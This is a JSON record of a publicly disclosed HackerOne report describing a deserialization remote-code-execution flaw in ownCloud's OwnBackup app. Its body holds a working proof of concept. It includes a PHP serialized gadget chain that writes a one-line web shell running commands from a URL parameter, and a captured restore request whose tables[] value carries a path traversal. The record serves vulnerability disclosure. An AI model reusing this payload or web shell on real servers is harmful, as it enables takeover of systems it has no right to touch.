@@ -1,0 +1,136 @@
+{
+  "id": 562335,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC81NjIzMzU=",
+  "url": "https://hackerone.com/reports/562335",
+  "title": "Remote Code Execution through Deserialization Attack in OwnBackup app.",
+  "state": "Closed",
+  "substate": "informative",
+  "severity_rating": "critical",
+  "readable_substate": "Informative",
+  "created_at": "2019-05-02T21:35:03.162Z",
+  "submitted_at": "2019-05-02T21:35:03.162Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "q3rv0",
+    "url": "/q3rv0",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 3059,
+    "url": "https://hackerone.com/owncloud",
+    "handle": "owncloud",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/003/059/d31dc64427bbbf2e428a0b0b97bce59b98d2ba0d_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/003/059/d31dc64427bbbf2e428a0b0b97bce59b98d2ba0d_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [],
+    "submission_state": "paused",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "ownCloud",
+      "twitter_handle": "ownCloud",
+      "website": "https://www.owncloud.com",
+      "about": "ownCloud GmbH is the company behind the ownCloud Project - the most downloaded open source project for data and file sync, share and view."
+    }
+  },
+  "has_bounty?": false,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2019-07-01T16:35:37.405Z",
+  "bug_reporter_agreed_on_going_public_at": "2019-06-05T15:52:48.646Z",
+  "team_member_agreed_on_going_public_at": "2019-07-01T16:35:37.320Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "I found a deserialization vulnerability in the [OwnBackup](https://marketplace.owncloud.com/apps/ownbackup) app, this vulnerability allows to execute remote code in the server. \n\nAn administrator user could install the vulnerable app, or take advantage of this vulnerability if the **OwnBackup** application is installed.\n\nBelow are the steps to properly exploit the deserialization vulnerability.\n\n**Step 1:** Login in the Owncloud application as an administrator user.\n\n**Step 2:** Install the **OwnBackup** app from the Marketplace.\n\n**Step 3:** Go to **Files** and upload the following files to the server.\n\n* **structure.xml**\n```\n<?xml version=\"1.0\" ?>\n<database><name>*dbname*</name><create>true</create><overwrite>false</overwrite><charset>utf8mb4</charset><table><name>oc_accounts</name><declaration><field><name>id</name><type>integer</type><default>0</default><notnull>true</notnull><autoincrement>1</autoincrement><unsigned>true</unsigned><length>8</length></field><field><name>email</name><type>text</type><default/><notnull>false</notnull><length>255</length></field><field><name>user_id</name><type>text</type><default/><notnull>true</notnull><length>255</length></field><field><name>lower_user_id</name><type>text</type><default/><notnull>true</notnull><length>255</length></field><field><name>display_name</name><type>text</type><default/><notnull>false</notnull><length>255</length></field><field><name>quota</name><type>text</type><default/><notnull>false</notnull><length>32</length></field><field><name>last_login</name><type>integer</type><default>0</default><notnull>true</notnull><length>4</length></field><field><name>backend</name><type>text</type><default/><notnull>true</notnull><length>64</length></field><field><name>home</name><type>text</type><default/><notnull>true</notnull><length>1024</length></field><field><name>state</name><type>integer</type><default>0</default><notnull>true</notnull><length>2</length></field><index><name>UNIQ_907AA303A76ED395</name><unique>true</unique><field><name>user_id</name><sorting>ascending</sorting></field></index><index><name>lower_user_id_index</name><unique>true</unique><field><name>lower_user_id</name><sorting>ascending</sorting></field></index><index><name>display_name_index</name><field><name>display_name</name><sorting>ascending</sorting></field></index><index><name>email_index</name><field><name>email</name><sorting>ascending</sorting></field></index></declaration></table></database>\n```\n\n* **data.dump**\n```\nO:33:\"Swift_Transport_SendmailTransport\":3:{s:10:\"*_buffer\";O:31:\"Swift_ByteStream_FileByteStream\":4:{s:38:\"Swift_ByteStream_FileByteStream_path\";s:14:\"/tmp/pwned.php\";s:38:\"Swift_ByteStream_FileByteStream_mode\";s:3:\"w+b\";s:56:\"Swift_ByteStream_AbstractFilterableInputStream_filters\";a:0:{}s:60:\"Swift_ByteStream_AbstractFilterableInputStream_writeBuffer\";s:57:\"<?php system($_GET['exec']); ?> // fedef@secsignal.org\n//\";}s:11:\"*_started\";b:1;s:19:\"*_eventDispatcher\";O:34:\"Swift_Events_SimpleEventDispatcher\":0:{}}\n```\n\n**Step 4:** Go to **admin** > **Settings** > **Additional**.\n\n**Step 5:** In **OwnBackup** > **Create Backup**.\n\n**Step 6:** Select the created backup and select any table to restore > **Restore tables**\n\n**Step 7:** Capture the next request with the BurpSuite proxy.\n\n```\nPOST /owncloud/index.php/apps/ownbackup/restore-tables HTTP/1.1\nHost: localhost\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:57.0) Gecko/20100101 Firefox/57.0\nAccept: */*\nAccept-Language: es-AR,es;q=0.8,en-US;q=0.5,en;q=0.3\nAccept-Encoding: gzip, deflate\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nrequesttoken: \nOCS-APIREQUEST: true\nX-Requested-With: XMLHttpRequest\nContent-Length: 45\nCookie: ocyqfze0wn1b=u1b58qbra5g0lh2rujgofg2f77; oc_sessionPassphrase=hAgcALFZ%2FrAi6y%2BtM8KNRbpzscVNFLnPIi1tz6zPzRCyCjUoFpZd5xlZOejCE2zoN5Dz4io832pAeKlPu7grxmHVGflUFJ2hrE0xdnovBqxGgEQN7VC1i6GbEaHfW1NP; shortest-last-redirect-time=1500074341246; _ga=GA1.1.1537606638.1500074341; shortest-last-pop-under=1500074352780; KCFINDER_showname=on; KCFINDER_showsize=off; KCFINDER_showtime=off; KCFINDER_order=name; KCFINDER_orderDesc=off; KCFINDER_view=thumbs; KCFINDER_displaySettings=off; MANTIS_MANAGE_CONFIG_COOKIE=0%3A0%3A-2; MANTIS_PROJECT_COOKIE=5\nConnection: close\n\ntimestamp=1555661563&tables%5B%5D=oc_accounts\n```\nAnd change the value of the parameter **tables[]** by the following path traversal.\n\n```\n../../admin/files\n```\nThe modified request is left as follows.\n\n```\nPOST /owncloud/index.php/apps/ownbackup/restore-tables HTTP/1.1\nHost: localhost\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:57.0) Gecko/20100101 Firefox/57.0\nAccept: */*\nAccept-Language: es-AR,es;q=0.8,en-US;q=0.5,en;q=0.3\nAccept-Encoding: gzip, deflate\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nrequesttoken: \nOCS-APIREQUEST: true\nX-Requested-With: XMLHttpRequest\nContent-Length: 45\nCookie: ocyqfze0wn1b=u1b58qbra5g0lh2rujgofg2f77; oc_sessionPassphrase=hAgcALFZ%2FrAi6y%2BtM8KNRbpzscVNFLnPIi1tz6zPzRCyCjUoFpZd5xlZOejCE2zoN5Dz4io832pAeKlPu7grxmHVGflUFJ2hrE0xdnovBqxGgEQN7VC1i6GbEaHfW1NP; shortest-last-redirect-time=1500074341246; _ga=GA1.1.1537606638.1500074341; shortest-last-pop-under=1500074352780; KCFINDER_showname=on; KCFINDER_showsize=off; KCFINDER_showtime=off; KCFINDER_order=name; KCFINDER_orderDesc=off; KCFINDER_view=thumbs; KCFINDER_displaySettings=off; MANTIS_MANAGE_CONFIG_COOKIE=0%3A0%3A-2; MANTIS_PROJECT_COOKIE=5\nConnection: close\n\ntimestamp=1555661563&tables%5B%5D=../../admin/files\n```\nThe serialized payload within the **data.dump** file is intended to create the file **pwned.php** within the **/tmp** directory as a PoC. But the same file could be created within the web directory, to execute commands remotely.\n\nContents of the file pwned.php.\n```\n<?php system($_GET['exec']); ?> // fedef@secsignal.org\n```\n**Step 8:** View the **/tmp/pwned.php** file created correctly.\n\n## Impact\n\nAn attacker could execute commands remotely on the server.",
+  "weakness": {
+    "id": 52,
+    "name": "Deserialization of Untrusted Data"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 483000,
+      "file_name": "structure.xml",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/483/000/8c1a614ffe50809c62b1287d4ada5c869caf6445/structure.xml?response-content-disposition=attachment%3B%20filename%3D%22structure.xml%22%3B%20filename%2A%3DUTF-8%27%27structure.xml&response-content-type=application%2Foctet-stream&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQS6SCAH72%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T132209Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDu%2B5Pwo%2F34eoeVeuWsr%2Ff9B54eFSJHpHqs9we%2BjQAH6gIhALp00VqCzQ3yXDicmppc8nMEwhMltHZsqN0RcGzFE1GqKrIFCHUQAxoMMDEzNjE5Mjc0ODQ5Igwkers7f9aKGbx%2BvDcqjwVWDMAhBUKhOq6mxVC7xmKOa%2FU2AiQBQKvDNaKfEmdipLMP6n95LC8VlOQ3Ca%2B7a8IxSNPEW%2FMJrckmzRQkQn5Pvo7LyCxG1l6k7KZzOYPdFRTU7P2FcXBvM6OhRy8ERlHZ1Ufnved4qCHN0953KV512I88RdKF2UQ9KA9EEzg3ey2SzXbnBk2JKsmpPRc0sUDb4ZMn4GDyk%2B2mbDjFILmQt6lr%2B6v0UoAJ%2B7v4%2F%2F852Q6Ruj9P1iez9HOSmDy3175zVvNBeZ4WctM1b8jW6o%2BmI4wZT%2FgWlgSufI1k6yaDWkc%2FE3Bn%2BpLvQoQXU80KrdN1Yr3AjY%2BuRyqxmectMc5y%2Br2%2F%2FwomOAO3I7t5j85rAvGeCLnU1ZAYisFSaSSgAJ%2BfsZD3xX9YCITIgC401%2F5etOaBcdLCaIxhXTp4wk5QS7eRBWvkzPZGEUcM52Rtz1NPZ0uXWarmK9P4ZIqYLWu82nHAH0wf3c3zd07rclVWahRXRkxP0wL3906s66oMXu%2FAgOj02dajNNZpgK8AaMKZXh5LU98RMkHWul32xDirzkDtJ6wBhMOXNHeLLut%2FijTOpDPFtCEBcHCr43hYLb1oSRkvigVVHtwhd%2BDjkszCy1F3hxu7H2ujIa9DoZ20hfrH4QAdqgLvpCC5kvd9Mdm9%2Fx13AdQjdUqxw2uU5HHCcUUMvji7mFcM0YKL33beYGIrXk5AJSUULfcFoq3Vln%2FoLmEL9STeERNxXuI9ijvLiCJCbUpcqNlCitD7ewAHGbNSSxgqcuRKjxMizmXSxM5uuuRQlbl7%2BOU8q4LcVoDIFjj15cH0GRJIGCdM2OT1aQG%2F%2FURgsiaYaysR3DfHV5zWoNx%2FNh%2FdRuvtdIdbsxviMKq0ra4GOrABb%2BYWX5qJazI%2FwiuYHFwT6C%2FymmUklRtb8O7FwtNQp8ZsagCHes2g1O8LOYf5T0%2FOXV0bp7oUjKh25bYYogztfc9XxMWj9SG%2BcrOe8OCs8YNKO4wu1gapV5ceXDZq%2FbF7bPsNEkzubLAYNEzVpO8uqKPZd6oKWBP%2Frue89n87JX%2FKDXf2RuT5sO6X4%2FoVBQryJS%2B7K2SqOzxLHHOKg0mmsmeYRh0fWGzJhtEb%2B0a4xOk%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=79d362200fa1992ed955ba9014283a133948eba809af82434ab04777e1ae7c8d",
+      "file_size": 1833,
+      "type": "application/xml",
+      "moderated": null
+    },
+    {
+      "id": 483001,
+      "file_name": "data.dump",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/483/001/f23a24cad57472e137c02cf805c8a1d5ac4fccb9/data.dump?response-content-disposition=attachment%3B%20filename%3D%22data.dump%22%3B%20filename%2A%3DUTF-8%27%27data.dump&response-content-type=application%2Foctet-stream&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQS6SCAH72%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T132209Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDu%2B5Pwo%2F34eoeVeuWsr%2Ff9B54eFSJHpHqs9we%2BjQAH6gIhALp00VqCzQ3yXDicmppc8nMEwhMltHZsqN0RcGzFE1GqKrIFCHUQAxoMMDEzNjE5Mjc0ODQ5Igwkers7f9aKGbx%2BvDcqjwVWDMAhBUKhOq6mxVC7xmKOa%2FU2AiQBQKvDNaKfEmdipLMP6n95LC8VlOQ3Ca%2B7a8IxSNPEW%2FMJrckmzRQkQn5Pvo7LyCxG1l6k7KZzOYPdFRTU7P2FcXBvM6OhRy8ERlHZ1Ufnved4qCHN0953KV512I88RdKF2UQ9KA9EEzg3ey2SzXbnBk2JKsmpPRc0sUDb4ZMn4GDyk%2B2mbDjFILmQt6lr%2B6v0UoAJ%2B7v4%2F%2F852Q6Ruj9P1iez9HOSmDy3175zVvNBeZ4WctM1b8jW6o%2BmI4wZT%2FgWlgSufI1k6yaDWkc%2FE3Bn%2BpLvQoQXU80KrdN1Yr3AjY%2BuRyqxmectMc5y%2Br2%2F%2FwomOAO3I7t5j85rAvGeCLnU1ZAYisFSaSSgAJ%2BfsZD3xX9YCITIgC401%2F5etOaBcdLCaIxhXTp4wk5QS7eRBWvkzPZGEUcM52Rtz1NPZ0uXWarmK9P4ZIqYLWu82nHAH0wf3c3zd07rclVWahRXRkxP0wL3906s66oMXu%2FAgOj02dajNNZpgK8AaMKZXh5LU98RMkHWul32xDirzkDtJ6wBhMOXNHeLLut%2FijTOpDPFtCEBcHCr43hYLb1oSRkvigVVHtwhd%2BDjkszCy1F3hxu7H2ujIa9DoZ20hfrH4QAdqgLvpCC5kvd9Mdm9%2Fx13AdQjdUqxw2uU5HHCcUUMvji7mFcM0YKL33beYGIrXk5AJSUULfcFoq3Vln%2FoLmEL9STeERNxXuI9ijvLiCJCbUpcqNlCitD7ewAHGbNSSxgqcuRKjxMizmXSxM5uuuRQlbl7%2BOU8q4LcVoDIFjj15cH0GRJIGCdM2OT1aQG%2F%2FURgsiaYaysR3DfHV5zWoNx%2FNh%2FdRuvtdIdbsxviMKq0ra4GOrABb%2BYWX5qJazI%2FwiuYHFwT6C%2FymmUklRtb8O7FwtNQp8ZsagCHes2g1O8LOYf5T0%2FOXV0bp7oUjKh25bYYogztfc9XxMWj9SG%2BcrOe8OCs8YNKO4wu1gapV5ceXDZq%2FbF7bPsNEkzubLAYNEzVpO8uqKPZd6oKWBP%2Frue89n87JX%2FKDXf2RuT5sO6X4%2FoVBQryJS%2B7K2SqOzxLHHOKg0mmsmeYRh0fWGzJhtEb%2B0a4xOk%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=70c1aff28090ca54be88bad2771df2126e00b4995f724e38114a3392b50730c6",
+      "file_size": 529,
+      "type": "application/octet-stream",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 15,
+  "voters": [
+    "theblackcompany",
+    "tulswani",
+    "un_kn0wn",
+    "cryptographer",
+    "tiago-danin",
+    "nonbetter1",
+    "queen_of_hearts",
+    "1vanchen",
+    "hubertfarnsworth",
+    "svphan",
+    "and 5 more..."
+  ],
+  "severity": {
+    "rating": "critical",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 468,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "owncloud/core",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
